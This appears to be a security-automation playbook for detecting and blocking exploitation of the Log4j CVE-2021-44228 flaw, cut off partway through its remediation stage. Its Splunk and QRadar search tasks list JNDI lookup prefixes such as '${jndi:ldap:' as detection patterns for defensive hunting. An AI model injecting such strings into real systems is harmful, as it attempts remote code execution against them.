id: CVE-2021-44228 - Log4j RCE
version: -1
name: CVE-2021-44228 - Log4j RCE
description: "Critical RCE Vulnerability: log4j - CVE-2021-44228\n\nOn Dec. 9, 2021,\
  \ a remote code execution (RCE) vulnerability in Apache log4j 2 was identified being\
  \ exploited in the wild. Public proof of concept (PoC) code was released and subsequent\
  \ investigation revealed that exploitation was incredibly easy to perform. \n\n\
  On Dec. 14 2021, another vulnerability was discovered related the log4j 0-day exploit\
  \ known as CVE-2021-45046.\n\n**Affected Version**\n\nApache Log4j 2.x <= 2.15.0-rc1\n\
  \nThis playbook should be triggered manually or can be configured as a job.\nPlease create a new incident and\
  \ choose the **CVE-2021-44228 - Log4j RCE** playbook and **Rapid Breach Response**\
  \ incident type.\n\n**The playbook includes the following tasks:**\n\n* Collect\
  \ related known indicators from several sources.\n* Indicators and exploitation\
  \ patterns hunting using PAN-OS, Cortex XDR and SIEM products.\n* Block indicators\
  \ automatically or manually.\n\n**Mitigations:**\n* Apache official CVE-2021-44228\
  \ patch.\n* Unit42 recommended mitigations.\n* Detection Rules.\n    * Snort\n \
  \   * Suricata\n    * Sigma\n    * Yara\n\nMore information:\n[Apache Log4j Vulnerability\
  \ Is Actively Exploited in the Wild (CVE-2021-44228)](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/)\n\
  \nNote: This is a beta playbook, which lets you implement and test pre-release software.\
  \ Since the playbook is beta, it might contain bugs. Updates to the pack during\
  \ the beta phase might include non-backward compatible features. We appreciate your\
  \ feedback on the quality and usability of the pack to help us identify issues,\
  \ fix them, and continually improve."
starttaskid: "0"
tasks:
  "0":
    id: "0"
    taskid: 115864a0-53ec-4523-8c8e-84806a7158e1
    type: start
    task:
      id: 115864a0-53ec-4523-8c8e-84806a7158e1
      version: -1
      name: ""
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "1"
      - "66"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -1290
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "1":
    id: "1"
    taskid: 8a10857a-f267-4994-8e45-9db51eb73a45
    type: title
    task:
      id: 8a10857a-f267-4994-8e45-9db51eb73a45
      version: -1
      name: Collect Indicators
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "2"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 2150,
          "y": -1130
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "2":
    id: "2"
    taskid: b8a458e9-9b7e-4241-86e3-d8749a32a34e
    type: regular
    task:
      id: b8a458e9-9b7e-4241-86e3-d8749a32a34e
      version: -1
      name: Collect indicators from GreyNoise
      description: This script will extract indicators from HTML and will handle bad
        TLD to avoid file extensions false positives.
      scriptName: ParseHTMLIndicators
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "8"
    scriptarguments:
      unescape_domain:
        simple: "False"
      url:
        simple: https://gist.githubusercontent.com/gnremy/c546c7911d5f876f263309d7161a7217/raw/170f7d6cf92172443ecc68db0b6cbd4d8226a398/CVE-2021-44228_IPs.csv
    continueonerror: true
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 2150,
          "y": -980
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "6":
    id: "6"
    taskid: 65d3cae6-bfc6-4247-86c9-7c2382c5bb71
    type: regular
    task:
      id: 65d3cae6-bfc6-4247-86c9-7c2382c5bb71
      version: -1
      name: Download Suricata Rules
      description: |-
        Download Suricata Rules.
        Please note the log4j rules are part of the released package.
      scriptName: http
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "8"
    scriptarguments:
      filename:
        simple: emerging-exploit-suricata.rules
      method:
        simple: GET
      saveAsFile:
        simple: "yes"
      url:
        simple: https://rules.emergingthreatspro.com/open/suricata-5.0/rules/emerging-exploit.rules
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -980
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: true
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "7":
    id: "7"
    taskid: e0e4f802-1be3-44ff-803f-b5326cc83114
    type: regular
    task:
      id: e0e4f802-1be3-44ff-803f-b5326cc83114
      version: -1
      name: Download Snort Rules
      description: |-
        Download Snort Rules.
        Please note the log4j rules are part of the released package.
      scriptName: http
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "8"
    scriptarguments:
      filename:
        simple: emerging-exploit-snort.rules
      method:
        simple: GET
      saveAsFile:
        simple: "yes"
      url:
        simple: https://rules.emergingthreatspro.com/open/snort-2.9.0/rules/emerging-exploit.rules
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1690,
          "y": -980
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: true
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "8":
    id: "8"
    taskid: 2990fb6e-ad3b-4ab8-8eb3-4ae250ab96d8
    type: title
    task:
      id: 2990fb6e-ad3b-4ab8-8eb3-4ae250ab96d8
      version: -1
      name: Extract Indicators
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "9"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -800
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "9":
    id: "9"
    taskid: 0bf2da79-3438-4930-8d23-4f12536a2c2e
    type: regular
    task:
      id: 0bf2da79-3438-4930-8d23-4f12536a2c2e
      version: -1
      name: Extract Indicators From Data Collected
      description: commands.local.cmd.extract.indicators
      script: Builtin|||extractIndicators
      type: regular
      iscommand: true
      brand: Builtin
    nexttasks:
      '#none#':
      - "10"
    scriptarguments:
      text:
        complex:
          root: http.parsedBlog
          accessor: indicators
    continueonerror: true
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -640
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "10":
    id: "10"
    taskid: ce4704fd-06f0-41f0-803f-9ac321115cd3
    type: title
    task:
      id: ce4704fd-06f0-41f0-803f-9ac321115cd3
      version: -1
      name: Tag and Link Indicators
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "57"
      - "58"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -440
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "15":
    id: "15"
    taskid: 51a5d5e0-a1e3-4793-8ec0-54d64d866264
    type: regular
    task:
      id: 51a5d5e0-a1e3-4793-8ec0-54d64d866264
      version: -1
      name: Link Indicators To Incident
      description: commands.local.cmd.associate.indicators
      script: Builtin|||associateIndicatorsToIncident
      type: regular
      iscommand: true
      brand: Builtin
    nexttasks:
      '#none#':
      - "36"
    scriptarguments:
      incidentId:
        complex:
          root: incident
          accessor: id
      indicatorsValues:
        complex:
          root: ExtractedIndicators.IP
          filters:
          - - operator: isNotEmpty
              left:
                value:
                  simple: ExtractedIndicators.IP
                iscontext: true
          transformers:
          - operator: append
            args:
              item:
                value:
                  simple: ExtractedIndicators.Domain
                iscontext: true
          - operator: append
            args:
              item:
                value:
                  simple: ExtractedIndicators.URL
                iscontext: true
          - operator: append
            args:
              item:
                value:
                  simple: ExtractedIndicators.CVE
                iscontext: true
          - operator: append
            args:
              item:
                value:
                  simple: ExtractedIndicators.File
                iscontext: true
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -80
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "16":
    id: "16"
    taskid: 804a5a08-829f-46d2-8f29-210025186ba9
    type: title
    task:
      id: 804a5a08-829f-46d2-8f29-210025186ba9
      version: -1
      name: SIEM Hunting
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "19"
      - "20"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 760,
          "y": 560
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "17":
    id: "17"
    taskid: ce0aea93-2a13-4cde-844d-cbc6bae372dd
    type: title
    task:
      id: ce0aea93-2a13-4cde-844d-cbc6bae372dd
      version: -1
      name: Palo Alto Networks Hunting
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "27"
      - "28"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1700,
          "y": 560
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "19":
    id: "19"
    taskid: 9a399bf5-ef89-4244-8591-dc17d17d764c
    type: playbook
    task:
      id: 9a399bf5-ef89-4244-8591-dc17d17d764c
      version: -1
      name: Splunk Indicator Hunting
      description: This playbook queries Splunk for indicators such as file hashes,
        IP addresses, domains, or urls. It outputs detected users, ip addresses, and
        hostnames related to the indicators.
      playbookName: Splunk Indicator Hunting
      type: playbook
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "37"
    scriptarguments:
      IPAddress:
        complex:
          root: ExtractedIndicators
          accessor: IP
          transformers:
          - operator: uniq
      IndexName:
        simple: index=*
      SelectFields:
        simple: source,timestamp
      URLDomain:
        complex:
          root: ExtractedIndicators
          accessor: Domain
          transformers:
          - operator: uniq
      earliest_time:
        complex:
          root: inputs.SplunkEarliestTime
      event_limit:
        simple: "100"
      latest_time:
        complex:
          root: inputs.SplunkLatestTime
    separatecontext: true
    loop:
      iscommand: false
      scriptArguments:
        IPAddress:
          complex:
            root: ExtractedIndicators
            accessor: IP
            transformers:
            - operator: uniq
        IndexName:
          simple: index=*
        MD5:
          complex:
            root: ExtractedIndicators
            filters:
            - - operator: stringHasLength
                left:
                  value:
                    simple: ExtractedIndicators
                  iscontext: true
                right:
                  value:
                    simple: "32"
            accessor: File
            transformers:
            - operator: uniq
        SHA1:
          complex:
            root: ExtractedIndicators
            filters:
            - - operator: stringHasLength
                left:
                  value:
                    simple: ExtractedIndicators
                  iscontext: true
                right:
                  value:
                    simple: "40"
            accessor: File
            transformers:
            - operator: uniq
        SHA256:
          complex:
            root: ExtractedIndicators
            filters:
            - - operator: stringHasLength
                left:
                  value:
                    simple: ExtractedIndicators
                  iscontext: true
                right:
                  value:
                    simple: "64"
            accessor: File
            transformers:
            - operator: uniq
        SelectFields:
          simple: source,timestamp
        URLDomain:
          complex:
            root: ExtractedIndicators
            accessor: Domain
            transformers:
            - operator: uniq
        earliest_time:
          complex:
            root: inputs.SplunkEarliestTime
        event_limit:
          simple: "100"
        latest_time:
          complex:
            root: inputs.SplunkLatestTime
      exitCondition: ""
      wait: 1
      max: 100
    view: |-
      {
        "position": {
          "x": 970,
          "y": 720
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: true
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "20":
    id: "20"
    taskid: 219a4e72-6655-4f9d-815b-a26a7999a9fa
    type: playbook
    task:
      id: 219a4e72-6655-4f9d-815b-a26a7999a9fa
      version: -1
      name: QRadar Indicator Hunting V2
      description: 'The Playbook queries QRadar SIEM for indicators such as file hashes,
        IP addresses, domains, or urls. '
      playbookName: QRadar Indicator Hunting V2
      type: playbook
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "37"
    scriptarguments:
      IPAddress:
        complex:
          root: ExtractedIndicators
          accessor: IP
          transformers:
          - operator: uniq
      InvestigationIPFields:
        simple: sourceip,destinationip
      InvestigationUserFields:
        simple: username
      QradarIPfield:
        simple: sourceip,destinationip
      TimeFrame:
        complex:
          root: inputs.QRadarTimeRange
      URLDomain:
        complex:
          root: ExtractedIndicators
          accessor: Domain
          transformers:
          - operator: uniq
    separatecontext: true
    loop:
      iscommand: false
      scriptArguments:
        IPAddress:
          complex:
            root: ExtractedIndicators
            accessor: IP
            transformers:
            - operator: uniq
        InvestigationIPFields:
          simple: sourceip,destinationip
        InvestigationUserFields:
          simple: username
        MD5:
          complex:
            root: ExtractedIndicators.File
            filters:
            - - operator: stringHasLength
                left:
                  value:
                    simple: ExtractedIndicators.File
                  iscontext: true
                right:
                  value:
                    simple: "32"
            transformers:
            - operator: uniq
        QradarIPfield:
          simple: sourceip,destinationip
        SHA1:
          complex:
            root: ExtractedIndicators.File
            filters:
            - - operator: stringHasLength
                left:
                  value:
                    simple: ExtractedIndicators.File
                  iscontext: true
                right:
                  value:
                    simple: "40"
            transformers:
            - operator: uniq
        SHA256:
          complex:
            root: ExtractedIndicators.File
            filters:
            - - operator: stringHasLength
                left:
                  value:
                    simple: ExtractedIndicators.File
                  iscontext: true
                right:
                  value:
                    simple: "64"
            transformers:
            - operator: uniq
        TimeFrame:
          complex:
            root: inputs.QRadarTimeRange
        URLDomain:
          complex:
            root: ExtractedIndicators
            accessor: Domain
            transformers:
            - operator: uniq
      exitCondition: ""
      wait: 1
      max: 100
    view: |-
      {
        "position": {
          "x": 550,
          "y": 720
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: true
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "21":
    id: "21"
    taskid: 375e2dbd-d28a-48c9-8db5-ce70766e10e7
    type: title
    task:
      id: 375e2dbd-d28a-48c9-8db5-ce70766e10e7
      version: -1
      name: SIEM Advanced Hunting
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "22"
      - "24"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": -280,
          "y": 560
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "22":
    id: "22"
    taskid: 9a9811f7-6a93-4998-8330-cc0df3326b5e
    type: condition
    task:
      id: 9a9811f7-6a93-4998-8330-cc0df3326b5e
      version: -1
      name: Is Splunk Enabled?
      description: Check if Splunk instance is enabled.
      type: condition
      iscommand: false
      brand: ""
    nexttasks:
      '#default#':
      - "37"
      "Yes":
      - "26"
    separatecontext: false
    conditions:
    - label: "Yes"
      condition:
      - - operator: isExists
          left:
            value:
              complex:
                root: modules
                filters:
                - - operator: isEqualString
                    left:
                      value:
                        simple: modules.brand
                      iscontext: true
                    right:
                      value:
                        simple: SplunkPy
                - - operator: isEqualString
                    left:
                      value:
                        simple: modules.state
                      iscontext: true
                    right:
                      value:
                        simple: active
            iscontext: true
    view: |-
      {
        "position": {
          "x": -10,
          "y": 720
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "23":
    id: "23"
    taskid: 8103d615-deff-471b-8673-5c76b87f6eaf
    type: title
    task:
      id: 8103d615-deff-471b-8673-5c76b87f6eaf
      version: -1
      name: Threat Hunting
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "17"
      - "21"
      - "16"
      - "29"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1230,
          "y": 410
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "24":
    id: "24"
    taskid: d1589f39-7ac3-43d6-8580-95ff0dbc1021
    type: condition
    task:
      id: d1589f39-7ac3-43d6-8580-95ff0dbc1021
      version: -1
      name: Is QRadar Enabled?
      description: Check if Splunk instance is enabled.
      type: condition
      iscommand: false
      brand: ""
    nexttasks:
      '#default#':
      - "37"
      "Yes":
      - "25"
    separatecontext: false
    conditions:
    - label: "Yes"
      condition:
      - - operator: isExists
          left:
            value:
              complex:
                root: modules
                filters:
                - - operator: isEqualString
                    left:
                      value:
                        simple: modules.brand
                      iscontext: true
                    right:
                      value:
                        simple: QRadar_v2
                - - operator: isEqualString
                    left:
                      value:
                        simple: modules.state
                      iscontext: true
                    right:
                      value:
                        simple: active
            iscontext: true
    view: |-
      {
        "position": {
          "x": -550,
          "y": 720
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "25":
    id: "25"
    taskid: 6851e74b-bd10-4196-8953-c0f5cd42c172
    type: regular
    task:
      id: 6851e74b-bd10-4196-8953-c0f5cd42c172
      version: -1
      name: Build QRadar AQL Query
      description: Build QRadar AQL Query.
      scriptName: QRadarCreateAQLQuery
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "60"
    scriptarguments:
      base_field_match:
        simple: partial
      base_field_state:
        simple: include
      base_fields_to_search:
        simple: user_agent
      base_values_to_search:
        simple: '"${jndi:ldap:","${jndi:rmi:","${jndi:ldaps:","${jndi:dns:","{jndi:corba:","{jndi:iiop:","{jndi:nis:","{jndi:nds:"'
      select_fields:
        simple: DATEFORMAT(devicetime,'dd-MM-yyyy hh:mm'),LOGSOURCENAME(logsourceid),CATEGORYNAME(category),QIDNAME(qid),sourceip,destinationip,username')
      time_frame:
        complex:
          root: inputs.QRadarTimeRange
    continueonerror: true
    separatecontext: false
    view: |-
      {
        "position": {
          "x": -550,
          "y": 910
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "26":
    id: "26"
    taskid: fd3f3f31-92b8-47ba-8597-309a9c5a40fa
    type: regular
    task:
      id: fd3f3f31-92b8-47ba-8597-309a9c5a40fa
      version: -1
      name: Search for exploitation patterns
      description: Searches Splunk for suspicious file creation where the file path
        is under INETCACHE.
      script: '|||splunk-search'
      type: regular
      iscommand: true
      brand: ""
    nexttasks:
      '#none#':
      - "37"
    scriptarguments:
      earliest_time:
        complex:
          root: inputs.SplunkEarliestTime
      query:
        simple: index=${SplunkIndex} sourcetype=${SplunkSourcetype} "${jndi:ldap:"
          OR "${jndi:rmi:" OR "${jndi:ldaps:" OR "${jndi:dns:" OR "{jndi:corba:" OR
          "{jndi:iiop:" OR "{jndi:nis:" OR "{jndi:nds:"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": -10,
          "y": 910
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "27":
    id: "27"
    taskid: 67a09f95-40de-4c6f-8218-c0cbcdd6a605
    type: playbook
    task:
      id: 67a09f95-40de-4c6f-8218-c0cbcdd6a605
      version: -1
      name: Palo Alto Networks - Hunting And Threat Detection
      description: "This is a multipurpose playbook used for hunting and threat detection.\
        \ The playbook receives inputs based on hashes, IP addresses, or domain names\
        \ provided manually or from outputs by other playbooks. \nWith the received\
        \ indicators, the playbook leverages data received by PANW products including,\
        \ Cortex Data Lake, Autofocus and Pan-OS to search for IP addresses, host\
        \ names and users related to the provided indicators.\nThe output provided\
        \ by the playbook facilitates pivoting searches for possibly affected IP addresses\
        \ or users."
      playbookName: Palo Alto Networks - Hunting And Threat Detection
      type: playbook
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "37"
    scriptarguments:
      IPAddresses:
        complex:
          root: ExtractedIndicators
          accessor: IP
    separatecontext: true
    loop:
      iscommand: false
      exitCondition: ""
      wait: 1
      max: 100
    view: |-
      {
        "position": {
          "x": 1490,
          "y": 720
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: true
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "28":
    id: "28"
    taskid: 432d3033-0c03-4950-8c8b-2a07a75258ed
    type: playbook
    task:
      id: 432d3033-0c03-4950-8c8b-2a07a75258ed
      version: -1
      name: Panorama Query Logs for Related Session
      description: 'Query Panorama Logs of types: traffic, threat, url, data-filtering
        and wildfire.'
      playbookName: Panorama Query Logs
      type: playbook
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "37"
    scriptarguments:
      log_type:
        simple: threat
      query:
        simple: (threatid eq 91991) or (threatid eq 91994) or (threatid eq 91995)
          or (threatid eq 92001)
    separatecontext: true
    loop:
      iscommand: false
      exitCondition: ""
      wait: 1
      max: 100
    view: |-
      {
        "position": {
          "x": 1910,
          "y": 720
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: true
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "29":
    id: "29"
    taskid: 2d25e693-bf60-492a-8488-e8405454573d
    type: title
    task:
      id: 2d25e693-bf60-492a-8488-e8405454573d
      version: -1
      name: Cortex XDR - Hunt Linux OS
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "69"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 2390,
          "y": 560
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "32":
    id: "32"
    taskid: 8b6c7063-7246-4eb5-8de1-dfaa53944fd7
    type: condition
    task:
      id: 8b6c7063-7246-4eb5-8de1-dfaa53944fd7
      version: -1
      name: Should search using XDR Endpoint Script Execution?
      description: Checks whether to execute XDR shell script for exploitation hunting.
      type: condition
      iscommand: false
      brand: ""
    nexttasks:
      '#default#':
      - "37"
      "yes":
      - "33"
    separatecontext: false
    conditions:
    - label: "yes"
      condition:
      - - operator: isEqualString
          left:
            value:
              complex:
                root: inputs.XDRScriptExecution
            iscontext: true
          right:
            value:
              simple: "True"
          ignorecase: true
    view: |-
      {
        "position": {
          "x": 2560,
          "y": 890
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "33":
    id: "33"
    taskid: 71d92646-3514-43a2-855e-a60766974d78
    type: condition
    task:
      id: 71d92646-3514-43a2-855e-a60766974d78
      version: -1
      name: Should run on all known Linux OS endpoints?
      description: Checks whether the necessary input 'XDREndpointIDs' was provided.
      type: condition
      iscommand: false
      brand: ""
    nexttasks:
      '#default#':
      - "37"
      ALL:
      - "70"
      Specific:
      - "72"
    separatecontext: false
    conditions:
    - label: ALL
      condition:
      - - operator: isEqualString
          left:
            value:
              complex:
                root: inputs.XDREndpointIDs
            iscontext: true
          right:
            value:
              simple: ALL
          ignorecase: true
    - label: Specific
      condition:
      - - operator: isNotEmpty
          left:
            value:
              complex:
                root: inputs.XDREndpointIDs
            iscontext: true
      - - operator: isNotEqualString
          left:
            value:
              complex:
                root: inputs.XDREndpointIDs
            iscontext: true
          right:
            value:
              simple: ALL
          ignorecase: true
    view: |-
      {
        "position": {
          "x": 2740,
          "y": 1060
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "35":
    id: "35"
    taskid: d53c06d4-d17d-4f10-8f39-3a89979cdfd7
    type: playbook
    task:
      id: d53c06d4-d17d-4f10-8f39-3a89979cdfd7
      version: -1
      name: Rapid Breach Response - Set Incident Info
      description: This playbook is responsible for setting up the Rapid Breach Response
        Incident Info tab.
      playbookName: Rapid Breach Response - Set Incident Info
      type: playbook
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "23"
    scriptarguments:
      SourceOfIndicators:
        complex:
          root: http.parsedBlog
          accessor: sourceLink
      countTotalIndicators:
        complex:
          root: ExtractedIndicators
          accessor: Domain
          transformers:
          - operator: append
            args:
              item:
                value:
                  simple: ExtractedIndicators.IP
                iscontext: true
          - operator: append
            args:
              item:
                value:
                  simple: ExtractedIndicators.URL
                iscontext: true
          - operator: append
            args:
              item:
                value:
                  simple: ExtractedIndicators.File
                iscontext: true
          - operator: append
            args:
              item:
                value:
                  simple: ExtractedIndicators.CVE
                iscontext: true
          - operator: uniq
          - operator: count
      playbookDescription:
        complex:
          root: inputs.PlaybookDescription
    separatecontext: true
    loop:
      iscommand: false
      scriptArguments:
        SourceOfIndicators:
          complex:
            root: http.parsedBlog
            accessor: sourceLink
        countTotalIndicators:
          complex:
            root: ExtractedIndicators
            accessor: Domain
            transformers:
            - operator: append
              args:
                item:
                  value:
                    simple: ExtractedIndicators.IP
                  iscontext: true
            - operator: append
              args:
                item:
                  value:
                    simple: ExtractedIndicators.URL
                  iscontext: true
            - operator: append
              args:
                item:
                  value:
                    simple: ExtractedIndicators.File
                  iscontext: true
            - operator: append
              args:
                item:
                  value:
                    simple: ExtractedIndicators.CVE
                  iscontext: true
            - operator: uniq
            - operator: count
        playbookDescription:
          complex:
            root: inputs.Description
      exitCondition: ""
      wait: 1
      max: 100
    view: |-
      {
        "position": {
          "x": 1230,
          "y": 240
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: true
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "36":
    id: "36"
    taskid: fe3cdf0e-288e-40f3-8a7e-a69e591a45c7
    type: title
    task:
      id: fe3cdf0e-288e-40f3-8a7e-a69e591a45c7
      version: -1
      name: Handle Rapid Breach Response Layout
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "35"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1230,
          "y": 110
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "37":
    id: "37"
    taskid: bdfafcce-8a69-4de8-8bfc-6df56d9d0110
    type: title
    task:
      id: bdfafcce-8a69-4de8-8bfc-6df56d9d0110
      version: -1
      name: Remediation
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "39"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1240,
          "y": 1650
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "38":
    id: "38"
    taskid: 4a7b0b83-5ceb-4e3a-80ff-d7403f823daf
    type: playbook
    task:
      id: 4a7b0b83-5ceb-4e3a-80ff-d7403f823daf
      version: -1
      name: Block Indicators - Generic v2
      description: |+
        This playbook blocks malicious Indicators using all integrations that are enabled, using the following sub-playbooks:

        - Block URL - Generic
        - Block Account - Generic
        - Block IP - Generic v2
        - Block File - Generic v2
        - Block Email - Generic
        - Block Domain - Generic

      playbookName: Block Indicators - Generic v2
      type: playbook
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "74"
    scriptarguments:
      AutoCommit:
        simple: "No"
      CustomBlockRule:
        simple: "True"
      CustomURLCategory:
        simple: Demisto Remediation - Malicious URLs
      IP:
        complex:
          root: ExtractedIndicators
          accessor: IP
          transformers:
          - operator: uniq
      MD5:
        complex:
          root: ExtractedIndicators.File
          filters:
          - - operator: stringHasLength
              left:
                value:
                  simple: ExtractedIndicators.File
                iscontext: true
              right:
                value:
                  simple: "32"
          transformers:
          - operator: uniq
      SHA256:
        complex:
          root: ExtractedIndicators.File
          filters:
          - - operator: stringHasLength
              left:
                value:
                  simple: ExtractedIndicators.File
                iscontext: true
              right:
                value:
                  simple: "64"
          transformers:
          - operator: uniq
      URL:
        complex:
          root: ExtractedIndicators
          accessor: URL
          transformers:
          - operator: uniq
      URLListName:
        simple: Demisto Remediation - URL EDL
      Username:
        complex:
          root: DBotScore
          filters:
          - - operator: isEqualString
              left:
                value:
                  simple: DBotScore.Type
                iscontext: true
              right:
                value:
                  simple: username
              ignorecase: true
          - - operator: greaterThanOrEqual
              left:
                value:
                  simple: DBotScore.Score
                iscontext: true
              right:
                value:
                  simple: "3"
          accessor: Indicator
    separatecontext: true
    loop:
      iscommand: false
      scriptArguments:
        AutoCommit:
          simple: "No"
        CustomBlockRule:
          simple: "True"
        CustomURLCategory:
          simple: Demisto Remediation - Malicious URLs
        IP:
          complex:
            root: ExtractedIndicators
            accessor: IP
            transformers:
            - operator: uniq
        MD5:
          complex:
            root: ExtractedIndicators.File
            filters:
            - - operator: stringHasLength
                left:
                  value:
                    simple: ExtractedIndicators.File
                  iscontext: true
                right:
                  value:
                    simple: "32"
            transformers:
            - operator: uniq
        SHA256:
          complex:
            root: ExtractedIndicators.File
            filters:
            - - operator: stringHasLength
                left:
                  value:
                    simple: ExtractedIndicators.File
                  iscontext: true
                right:
                  value:
                    simple: "64"
            transformers:
            - operator: uniq
        URL:
          complex:
            root: ExtractedIndicators
            accessor: URL
            transformers:
            - operator: uniq
        URLListName:
          simple: Demisto Remediation - URL EDL
      exitCondition: ""
      wait: 1
      max: 0
    view: |-
      {
        "position": {
          "x": 1240,
          "y": 2050
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "39":
    id: "39"
    taskid: 48e7ecc8-afcf-4d14-8103-ed6d3ee644c3
    type: condition
    task:
      id: 48e7ecc8-afcf-4d14-8103-ed6d3ee644c3
      version: -1
      name: Block indicators automatically?
      description: Checks whether IOCs associated with the incident can be blocked
        automatically.
      type: condition
      iscommand: false
      brand: ""
    nexttasks:
      '#default#':
      - "40"
      "yes":
      - "41"
      - "38"
    separatecontext: false
    conditions:
    - label: "yes"
      condition:
